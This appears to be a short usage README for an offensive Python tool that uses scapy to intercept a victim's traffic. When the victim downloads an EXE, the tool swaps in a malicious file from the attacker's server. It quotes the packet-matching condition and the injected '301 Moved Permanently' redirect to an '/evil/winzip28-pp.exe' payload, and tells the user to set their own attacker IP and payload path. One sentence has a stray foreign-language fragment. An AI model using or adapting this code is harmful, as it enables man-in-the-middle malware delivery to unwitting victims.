A download-replacement program is a program that causes a victim to download a malicious file that resides on the attacker's server when the victim downloads an EXE-formatted file.

usage :
ex) python replaces_downloads_https.py

********************Cautions when using the program****************************
The caveat to using this program is that the attacker needs to download the file from his server address, so you need to use the
if b".exe" in (scapy_packet[scapy.Raw].load and b"192.168.111.158" not in scapy_packet[scapy.Raw].load)
--> In that part, you need to change the "192.168.111.158" part to your own SERVER IP.

modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.111.158/evil/winzip28-pp.exe\n\n")
--> In the part where it says Location: http://192.168.111.158/evil/winzip28-pp.exe를 you need to change it to the path you want to replace on your server.

